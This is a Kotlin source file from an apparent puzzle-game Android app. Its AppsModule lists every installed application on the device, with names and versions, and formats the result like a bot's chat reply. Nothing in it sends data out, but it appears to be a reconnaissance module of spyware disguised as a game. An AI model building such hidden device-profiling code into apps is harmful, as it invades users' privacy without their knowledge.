package com.puzzleblast.game.modules

import android.content.Context
import android.content.pm.ApplicationInfo

object AppsModule {
    suspend fun list(ctx: Context, withLabels: Boolean = false): String {
        val pm = ctx.packageManager
        val apps = pm.getInstalledApplications(0)
        return if (withLabels) {
            "📋 ${apps.size} apps\n" + apps.sortedBy { it.loadLabel(pm).toString() }.joinToString("\n") { ai ->
                "  ${ai.packageName} — ${ai.loadLabel(pm)} (${pm.getPackageInfo(ai.packageName, 0).versionName ?: "?"})"
            }
        } else {
            "📲 ${apps.size} packages\n" + apps.sortedBy { it.packageName }.joinToString("\n") { it.packageName }
        }
    }
}
